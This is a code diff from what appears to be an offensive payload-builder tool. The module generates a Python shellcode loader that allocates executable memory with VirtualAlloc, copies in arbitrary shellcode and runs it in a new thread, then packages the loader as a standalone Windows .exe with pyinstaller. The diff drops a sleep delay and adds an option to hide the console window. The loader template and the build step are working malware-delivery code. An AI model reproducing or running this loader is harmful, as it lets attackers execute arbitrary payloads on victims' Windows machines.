@@ -11,20 +11,19 @@ class exe_options(Moduleobject):
         ui.banner()
         self.values={'source':'',
                      'outfile':'%s'%(time.strftime('%m%Y')+str(random.randint(0,100))+'.exe'),
-                     'sleep':'5',
+                     'noconsole':False,
                      }
         self.read_code = r''
         self.outfile_dirpath = './output/'
 
-    def script_code(self,shellcode,sleeptime):
+    def script_code(self,shellcode):
         return ('''
-import time,ctypes
+import ctypes
     
 shellcode = ("%s")
             
             
 if __name__ == "__main__":
-    time.sleep(%s)
     ptr = ctypes.windll.kernel32.VirtualAlloc(0, 4096, ctypes.c_int(0x1000), ctypes.c_int(0x40))
     ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(shellcode)))
     byte = bytearray()
@@ -37,7 +36,7 @@ if __name__ == "__main__":
                                              ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%(shellcode,sleeptime))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%shellcode)
 
     def read_shellcode(self,filename):
         with open (filename,'r') as shellcode:
@@ -47,14 +46,16 @@ if __name__ == "__main__":
     def write_script(self,code):
         output_script_name = self.outfile_dirpath+self.values['outfile']+'.py'
         with open (output_script_name,'w') as code_write:
-            code_write.write(self.script_code(shellcode=code,
-                                              sleeptime=self.values['sleep']))
+            code_write.write(self.script_code(shellcode=code))
         print('\033[92m' + '[*]' + '\033[0m' + 'script was created succesfully ! ! ',end='\n')
 
     def generate_exe(self):
         if os.path.isfile(self.outfile_dirpath+self.values["outfile"]+".py"):
-            os.system('cd output;pyinstaller %s.py --noup --onefile --noconsole --clean;cd ..'
-                  %(self.values["outfile"]))
+            if self.values["noconsole"] == False:
+                command = 'cd output;pyinstaller %s.py --noup --onefile --clean;cd ..'%self.values["outfile"]
+            else:
+                command = 'cd output;pyinstaller %s.py --noup --onefile --noconsole --clean;cd ..'%(self.values["outfile"])
+            os.system(command)
             print('\033[92m'+'[*]'+'\033[0m'+'binary file was created succesfully ! ! ')
 
 
